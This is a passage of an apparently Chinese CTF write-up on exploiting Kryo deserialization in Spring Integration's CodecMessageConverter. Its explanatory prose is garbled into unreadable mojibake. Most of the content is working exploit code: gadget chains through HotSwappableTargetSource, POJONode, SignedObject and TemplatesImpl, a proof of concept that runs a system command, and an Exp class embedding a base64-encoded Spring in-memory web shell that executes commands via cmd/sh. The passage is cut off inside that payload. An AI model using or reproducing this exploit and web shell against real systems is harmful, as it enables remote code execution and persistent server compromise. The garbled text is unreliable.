class<br></code></pre></td></tr></table></figure><p>ç”¨çš„æ˜¯ä»<code>HotSwappableTargetSource</code>å¥—ä¸€å±‚ç„¶åè§¦å‘åˆ°<code>fastjson#toString</code>çš„gadgetã€‚</p><p>ä½†fastjsonæ˜¯Dubboè‡ªå¸¦çš„ï¼Œæœ¬é¢˜æ²¡æœ‰è¿™ä¸ªä¾èµ–ï¼Œä¹Ÿå°±æ˜¯è¦æ‰¾ååŠæ®µé“¾å­æ¥æ¥ä¸Š<code>toString</code>ã€‚</p><p>æ ¹æ®é¢˜ç›®æç¤ºç”¨HessianåŸç”ŸJDKå»æ‰“ï¼ˆHessianåœ¨é‚£æ¡é“¾åªå……å½“<code>source</code>è§¦å‘toStringï¼‰ï¼Œè¿™é‡Œç”¨åˆ°çš„å°±æ˜¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.activation.MimeTypeParameterList<br></code></pre></td></tr></table></figure><p>æ•´ä½“é“¾å­æ˜¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.activation.MimeTypeParameterList#toString<br>UIDefaults#get<br>UIDefaults#getFromHashTable<br>UIDefaults$LazyValue#createValue<br>SwingLazyValue#createValue<br>sun.reflect.misc.MethodUtil#invoke<br></code></pre></td></tr></table></figure><p>å…·ä½“çš„Hessianåˆ†æå°±å…äº†ï¼Œå¯ä»¥çœ‹ï¼š<a href="https://p4d0rn.gitbook.io/java/serial-journey/hessian_only_jdk#mimetypeparameterlist--methodutil">Hessian_Only_JDK | Java (gitbook.io)</a></p><p>æˆ‘ä»¬å¯¹<code>decode</code>æ–¹æ³•è¿›è¡Œè°ƒè¯•ï¼Œå‘ç°å®ƒä¼šè¿›åˆ°<code>kryo.readObject()</code>ä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™é‡Œå¯ä»¥è§¦å‘<code>kryo</code>ååºåˆ—åŒ–çš„æ‰“æ³•ï¼Œ<code>kryo</code>å’Œ<code>Hessian</code>æ˜¯ä¸€ç±»çš„ï¼Œéƒ½æ˜¯åŸºäº<code>Field</code>æœºåˆ¶ï¼Œä¼šè¿›å…¥åˆ°<code>hashMap.put</code>ä¸­ï¼Œå› æ­¤å¯ä»¥ç”¨<code>Hessian</code>çš„é“¾å­æ¥æ‰“ã€‚</p><p>é¦–å…ˆæœ¬åœ°å°è¯•ä¸‹kryoçš„<code>templatesImpl</code>é“¾å­å§ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">kyro#readObject() -&gt;<br>    hashMap#put() -&gt;<br>    HotSwappableTargetSource#equals() -&gt;<br>    Xstring#equals() -&gt;<br>    BaseJsonNode#toString() -&gt;<br>    templatesImpl#getOutputProperties()<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-literal">null</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;getTemplates()&#125;);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">pojoNode</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br>        <span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">hotSwappableTargetSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">hotSwappableTargetSource1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(hotSwappableTargetSource, <span class="hljs-string">&quot;1&quot;</span>);<br>        hashMap.put(hotSwappableTargetSource1, <span class="hljs-string">&quot;2&quot;</span>);<br><br>        setFieldValue(hotSwappableTargetSource, <span class="hljs-string">&quot;target&quot;</span>, pojoNode);<br>        setFieldValue(hotSwappableTargetSource1, <span class="hljs-string">&quot;target&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;a&quot;</span>));<br><br>        <span class="hljs-type">CodecMessageConverter</span> <span class="hljs-variable">codecMessageConverter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CodecMessageConverter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageCodec</span>());<br>        <span class="hljs-type">GenericMessage</span> <span class="hljs-variable">genericMessage</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GenericMessage</span>(hashMap);<br>        <span class="hljs-type">byte</span>[] decodemsg = (<span class="hljs-type">byte</span>[]) codecMessageConverter.fromMessage(genericMessage, <span class="hljs-literal">null</span>);<br>        System.out.println(URLEncoder.encode(Base64.getEncoder().encodeToString(decodemsg), <span class="hljs-string">&quot;UTF-8&quot;</span>));<br><br>        Message&lt;?&gt; messagecode = codecMessageConverter.toMessage(decodemsg, (MessageHeaders) <span class="hljs-literal">null</span>);<br>        messagecode.getPayload();<br>    &#125;<br></code></pre></td></tr></table></figure><p>ä¸å‡ºæ„å¤–çš„æŠ¥é”™äº†ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816161919403.png" alt="image-20240816161919403"></p><p>æŠ¥äº†<code>Null</code>æŒ‡é’ˆå¼‚å¸¸ï¼Œä¸‹ä¸ªæ–­ç‚¹çœ‹çœ‹ï¼Œè™½ç„¶å¼¹å‡ºcalcäº†ï¼Œä½†æ˜¯å®è´¨ä¸Šæ²¡æœ‰åˆ©ç”¨æˆåŠŸã€‚</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816162348967.png" alt="image-20240816162348967"></p><p>å› ä¸ºè°ƒè¯•è¿›å…¥åï¼Œä½ ä¼šå‘ç°å³ä½¿ç»™<code>_factory</code>èµ‹å€¼äº†ï¼Œæœ€ç»ˆè¿˜æ˜¯ä¼šå˜æˆ<code>null</code>ä»è€Œè§¦å‘å¼‚å¸¸ï¼Œå› ä¸º<code>_tfactory</code>æ˜¯<code>transient</code>ä¿®é¥°çš„ï¼Œä¸èƒ½å‚ä¸åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚è€Œä¸”å‰é¢ä¹Ÿè¯´è¿‡Kryoå’ŒHessianç±»ä¼¼ï¼Œä¹Ÿæœ‰è¿™ä¸ªç‰¹ç‚¹ã€‚</p><p>é‚£ä¹ˆå¯ä»¥ç”¨äºŒæ¬¡ååºåˆ—åŒ–ï¼Œè¿™æ ·å°±æ— å…³<code>_tfactory</code>äº†ã€‚<a href="https://eddiemurphy89.github.io/2024/08/04/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">äºŒæ¬¡ååºåˆ—åŒ– - EddieMurphyâ€™s blog (eddiemurphy89.github.io)</a></p><p>Gadgetå‘¼ä¹‹æ¬²å‡ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">kyro#readObject() -&gt;<br>hashMap#put() -&gt;<br>HotSwappableTargetSource#equals() -&gt;<br>Xstring#equals() -&gt;<br>BaseJsonNode#toString() -&gt;<br>SignedObject#getObject() -&gt;<br>HashMap#readObject() -&gt;<br>templatesImpl#getOutputProperties()<br></code></pre></td></tr></table></figure><p>æ³¨æ„é‡å†™<code>com.fasterxml.jackson.databind.node.BaseJsonNode</code>ï¼Œç§»é™¤å…¶<code>writeReplace()</code>æ–¹æ³•ï¼Œè®©Expé‡Œçš„ä¼˜å…ˆè°ƒç”¨æˆ‘ä»¬é‡å†™çš„æ–¹æ³•ï¼Œä»¥é¡ºåˆ©è¿›è¡Œå¯¹è±¡åºåˆ—åŒ–ï¼Œæ³¨æ„ä¸€ä¸‹æ–‡ä»¶ç»“æ„ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816170942916.png" alt="image-20240816170942916"></p><p>æµ‹è¯•ä¸€ä¸‹ï¼Œæœ¬åœ°é€šäº†ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816171350935.png" alt="image-20240816171350935"></p><p>è¡¥å……ä¸‹ï¼Œè¿™é‡Œç”¨Hessiané‚£äº›ä»€ä¹ˆSpring AOPä¹Ÿæ˜¯ç©ºæŒ‡é’ˆå¼‚å¸¸ï¼Œæ‰“ä¸åŠ¨ã€‚</p><h3 id="å¼€ç¼"><a href="#å¼€ç¼" class="headerlink" title="å¼€ç¼"></a>å¼€ç¼</h3><p>æ•´ä½“è°ƒç”¨é“¾ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java">CodecMessageConverter<br>    -&gt; toMessage(decodemsg, ...)<br>       <span class="hljs-built_in">this</span>.codec.decode(decodemsg, ...)<br><br>AbstractKryoCodec<br>    -&gt; decode(decodemsg, ...)<br><br>PojoCodec<br>    -&gt; doDecode(...)<br><br>Kryo<br>    -&gt; readObject(...)<br><br>MapSerializer<br>    -&gt; read(...)<br>       Map#put(hotSwappableTargetSource, ...)<br><br>HotSwappableTargetSource<br>    -&gt; equals(...)<br><br>XString<br>    -&gt; equals(pojoNode)<br><br>BaseJsonNode<br>    -&gt; toString()<br>       InternalNodeMapper#nodeToString(<span class="hljs-built_in">this</span>)<br><br>SignedObject<br>    -&gt; getObject()<br>       a.readObject()<br><br>BadAttributeValueExpException<br>    -&gt; readObject()<br>       valObj.toString()<br><br>BaseJsonNode<br>    -&gt; toString()<br>       InternalNodeMapper#nodeToString(<span class="hljs-built_in">this</span>)<br><br>TemplatesImpl<br>    -&gt; getOutputProperties()<br><br>...<br></code></pre></td></tr></table></figure><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><p>å…¶å®ä¸Šé¢Testå°±æ˜¯EXPï¼Œè¿™é‡Œè¿˜æ˜¯è±¡å¾æ€§ç»™ä¸€ä¸‹å§ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;<br><span class="hljs-keyword">import</span> org.springframework.integration.codec.CodecMessageConverter;<br><span class="hljs-keyword">import</span> org.springframework.integration.codec.kryo.MessageCodec;<br><span class="hljs-keyword">import</span> org.springframework.messaging.Message;<br><span class="hljs-keyword">import</span> org.springframework.messaging.MessageHeaders;<br><span class="hljs-keyword">import</span> org.springframework.messaging.support.GenericMessage;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        TemplatesImpl templates=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_class&quot;</span>,<span class="hljs-literal">null</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;getTemplates()&#125;);<br><br>        POJONode pojoNode=<span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br>        HotSwappableTargetSource hotSwappableTargetSource=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-number">1</span>);<br>        HotSwappableTargetSource hotSwappableTargetSource1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-number">2</span>);<br>        HashMap hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>        hashMap.put(hotSwappableTargetSource,<span class="hljs-string">&quot;1&quot;</span>);<br>        hashMap.put(hotSwappableTargetSource1,<span class="hljs-string">&quot;2&quot;</span>);<br>        setFieldValue(hotSwappableTargetSource,<span class="hljs-string">&quot;target&quot;</span>,pojoNode);<br>        setFieldValue(hotSwappableTargetSource1,<span class="hljs-string">&quot;target&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;a&quot;</span>));<br><br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">kpg</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        kpg.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">kp</span> <span class="hljs-operator">=</span> kpg.generateKeyPair();<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(hashMap, kp.getPrivate(), Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>));<br><br>        POJONode pojoNode1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(signedObject);<br>        HotSwappableTargetSource hotSwappableTargetSource2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-number">3</span>);<br>        HotSwappableTargetSource hotSwappableTargetSource3=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-number">4</span>);<br><br>        HashMap hashMap1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap1.put(hotSwappableTargetSource2,<span class="hljs-string">&quot;1&quot;</span>);<br>        hashMap1.put(hotSwappableTargetSource3,<span class="hljs-string">&quot;2&quot;</span>);<br><br>        setFieldValue(hotSwappableTargetSource2,<span class="hljs-string">&quot;target&quot;</span>,pojoNode1);<br>        setFieldValue(hotSwappableTargetSource3,<span class="hljs-string">&quot;target&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;b&quot;</span>));<br><br>        <span class="hljs-type">CodecMessageConverter</span> <span class="hljs-variable">codecMessageConverter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CodecMessageConverter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageCodec</span>());<br>        <span class="hljs-type">GenericMessage</span> <span class="hljs-variable">genericMessage</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GenericMessage</span>(hashMap1);<br>        <span class="hljs-type">byte</span>[] decodemsg = (<span class="hljs-type">byte</span>[]) codecMessageConverter.fromMessage(genericMessage, <span class="hljs-literal">null</span>);<br>        System.out.println(Base64.getEncoder().encodeToString(decodemsg));<br><br>        <span class="hljs-comment">//ååºåˆ—åŒ–</span><br>        <span class="hljs-comment">//Message&lt;?&gt; messagecode = codecMessageConverter.toMessage(decodemsg, (MessageHeaders) null);</span><br>        <span class="hljs-comment">//messagecode.getPayload();</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getTemplates() <span class="hljs-keyword">throws</span> CannotCompileException, NotFoundException, IOException &#123;<br>        ClassPool classPool=ClassPool.getDefault();<br>        CtClass ctClass=classPool.makeClass(<span class="hljs-string">&quot;Test&quot;</span>);<br>        ctClass.setSuperclass(classPool.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">block</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(block);<br>        <span class="hljs-keyword">return</span> ctClass.toBytecode();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†é—æ†¾çš„æ˜¯é¢˜ç›®ä¸å‡ºç½‘ï¼Œæœ¬åœ°è™½ç„¶å‡ºç½‘ä¹Ÿæ‰“ä¸äº†åå¼¹shellã€‚</p><p>é‚£ä¹ˆè¿™é‡Œå°±è¦å†™ä¸ªå†…å­˜é©¬è¿›å»äº†ã€‚</p><p>ä¹Ÿå¾ˆç®€å•ï¼Œç›´æ¥ç”¨å­˜çš„ä¸€ä¸ªSpringé©¬ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> javassist.CannotCompileException;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.NotFoundException;<br><span class="hljs-keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;<br><span class="hljs-keyword">import</span> org.springframework.integration.codec.CodecMessageConverter;<br><span class="hljs-keyword">import</span> org.springframework.integration.codec.kryo.MessageCodec;<br><span class="hljs-keyword">import</span> org.springframework.messaging.support.GenericMessage;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.KeyPair;<br><span class="hljs-keyword">import</span> java.security.KeyPairGenerator;<br><span class="hljs-keyword">import</span> java.security.Signature;<br><span class="hljs-keyword">import</span> java.security.SignedObject;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        TemplatesImpl templates=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        String s=<span class="hljs-string">&quot;yv66vgAAADQAzQoANQBOCABPCwAqAFAIAFEKAFIAUwoACQBUCABVCgAJAFYHAFcIAFgIAFkIAFoIAFsKAFwAXQoAXABeCgBfAGAHAGEKABEAYggAYwoAEQBkCgARAGUKABEAZggAZwsAKwBoCgBpAGoKAGkAawoAbABtCABuCwBvAHAHAHEHAHILAB4AcwoAdAB1CAB2CgApAHcKAHgAeQoAeAB6BwB8BwB/CAA6BwCABwCBBwCCCgApAIMIAIQKAHsAhQsAhgCHCwCGAIgKACcATgoAHwCJBwCKCgAzAIsHAIwBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAFc2hlbGwBAFIoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOylWAQANU3RhY2tNYXBUYWJsZQcAVwcAjQcAjgcAYQcAfwcAgQcAggEACkV4Y2VwdGlvbnMHAI8BAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYHAJABAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4HAIoBAApTb3VyY2VGaWxlAQANTWVtU2hlbGwuamF2YQwANgA3AQADY21kDACRAJIBAAdvcy5uYW1lBwCTDACUAJIMAJUAlgEAA3dpbgwAlwCYAQAQamF2YS9sYW5nL1N0cmluZwEAAnNoAQACLWMBAAdjbWQuZXhlAQACL2MHAJkMAJoAmwwAnACdBwCeDACfAKABABFqYXZhL3V0aWwvU2Nhbm5lcgwANgChAQACXEEMAKIAowwApAClDACmAJYBAAAMAKcAqAcAqQwAqgCrDACsADcHAK0MAK4ArwEAOW9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLnNlcnZsZXQuRGlzcGF0Y2hlclNlcnZsZXQuQ09OVEVYVAcAsAwAsQCyAQA1b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQBAFJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nDACzALQHALUMALYAtwEABmNvbmZpZwwAuAC5BwC6DAC7ALwMAL0AvgcAvwEAUm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQ